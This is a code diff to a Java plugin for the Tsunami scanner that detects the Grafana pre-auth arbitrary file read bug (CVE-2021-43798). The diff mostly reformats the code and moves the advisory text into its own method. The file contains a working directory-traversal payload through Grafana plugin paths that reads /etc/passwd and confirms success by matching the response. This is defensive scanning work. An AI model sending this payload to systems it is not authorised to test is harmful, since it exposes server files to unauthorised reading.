@@ -56,21 +56,22 @@ import javax.inject.Inject;
     type = PluginType.VULN_DETECTION,
     name = "GrafanaArbitraryFileReadingDetector",
     version = "1.0",
-    description = "This detector checks for Grafana Pre-Auth Arbitrary File Reading vulnerability "
-        + "(CVE_2021_43798).",
+    description =
+        "This detector checks for Grafana Pre-Auth Arbitrary File Reading vulnerability "
+            + "(CVE_2021_43798).",
     author = "threedr3am (qiaoer1320@gmail.com)",
-    bootstrapModule = GrafanaArbitraryFileReadingDetectorBootstrapModule.class
-)
+    bootstrapModule = GrafanaArbitraryFileReadingDetectorBootstrapModule.class)
 public class GrafanaArbitraryFileReadingDetector implements VulnDetector {
 
   private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
-  private static final String VUL_PATH_FMT = "public/plugins/{plugin}/..%2F..%2F..%2F..%2F.."
-      + "%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F.."
-      + "%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F.."
-      + "%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F.."
-      + "%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F.."
-      + "%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F.."
-      + "%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd";
+  private static final String VUL_PATH_FMT =
+      "public/plugins/{plugin}/..%2F..%2F..%2F..%2F.."
+          + "%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F.."
+          + "%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F.."
+          + "%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F.."
+          + "%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F.."
+          + "%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F.."
+          + "%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd";
   private static final Pattern VULNERABILITY_RESPONSE_PATTERN = Pattern.compile("(root:[x*]:0:0:)");
   private static final ImmutableList<String> PLUGINS =
       ImmutableList.of(
@@ -115,8 +116,7 @@ public class GrafanaArbitraryFileReadingDetector implements VulnDetector {
           "table",
           "stackdriver",
           "grafana-azure-monitor-datasource",
-          "grafana-simple-json-datasource"
-      );
+          "grafana-simple-json-datasource");
 
   private final Clock utcClock;
   private final HttpClient httpClient;
@@ -141,15 +141,35 @@ public class GrafanaArbitraryFileReadingDetector implements VulnDetector {
         .build();
   }
 
+  @Override
+  public ImmutableList<Vulnerability> getAdvisories() {
+    return ImmutableList.of(
+        Vulnerability.newBuilder()
+            .setMainId(
+                VulnerabilityId.newBuilder()
+                    .setPublisher("TSUNAMI_COMMUNITY")
+                    .setValue("CVE_2021_43798"))
+            .setSeverity(Severity.HIGH)
+            .addRelatedId(
+                VulnerabilityId.newBuilder().setPublisher("CVE").setValue("CVE-2021-43798"))
+            .setTitle("Grafana Pre-Auth Arbitrary File Reading vulnerability (CVE_2021_43798)")
+            .setDescription(
+                "In Grafana 8.0.0 to 8.3.0, there is an endpoint that can be accessed "
+                    + "without authentication. This endpoint has a directory traversal "
+                    + "vulnerability, and any user can read any file on the server "
+                    + "without authentication, causing information leakage.")
+            .setRecommendation("Update to 8.3.1 version or later.")
+            .build());
+  }
+
   private CheckResult checkUrlWithPlugin(NetworkService networkService) {
     for (String plugin : PLUGINS) {
       String targetUri =
           NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
               + VUL_PATH_FMT.replace("{plugin}", plugin);
       try {
-        HttpResponse response = httpClient.send(
-            HttpRequest.get(targetUri).withEmptyHeaders().build(),
-            networkService);
+        HttpResponse response =
+            httpClient.send(HttpRequest.get(targetUri).withEmptyHeaders().build(), networkService);
         if (response.status() == HttpStatus.OK && response.bodyString().isPresent()) {
           String responseBody = response.bodyString().get();
           if (VULNERABILITY_RESPONSE_PATTERN.matcher(responseBody).find()) {
@@ -163,8 +183,7 @@ public class GrafanaArbitraryFileReadingDetector implements VulnDetector {
     return CheckResult.buildForSecureService(networkService);
   }
 
-  public DetectionReport buildDetectionReport(
-      TargetInfo targetInfo, CheckResult checkResult) {
+  public DetectionReport buildDetectionReport(TargetInfo targetInfo, CheckResult checkResult) {
     NetworkService vulnerableNetworkService = checkResult.networkService();
     return DetectionReport.newBuilder()
         .setTargetInfo(targetInfo)
@@ -172,24 +191,8 @@ public class GrafanaArbitraryFileReadingDetector implements VulnDetector {
         .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
         .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
         .setVulnerability(
-            Vulnerability.newBuilder()
-                .setMainId(
-                    VulnerabilityId.newBuilder().setPublisher("TSUNAMI_COMMUNITY")
-                        .setValue("CVE_2021_43798"))
-                .setSeverity(Severity.HIGH)
-                .addRelatedId(
-                    VulnerabilityId.newBuilder()
-                        .setPublisher("CVE")
-                        .setValue("CVE-2021-43798"))
-                .setTitle("Grafana Pre-Auth Arbitrary File Reading vulnerability (CVE_2021_43798)")
-                .setDescription(
-                    "In Grafana 8.0.0 to 8.3.0, there is an endpoint that can be accessed "
-                        + "without authentication. This endpoint has a directory traversal "
-                        + "vulnerability, and any user can read any file on the server "
-                        + "without authentication, causing information leakage.")
-                .setRecommendation("Update to 8.3.1 version or later.")
-                .addAdditionalDetails(buildAdditionalDetail(checkResult))
-        )
+            this.getAdvisories().get(0).toBuilder()
+                .addAdditionalDetails(buildAdditionalDetail(checkResult)))
         .build();
   }
 
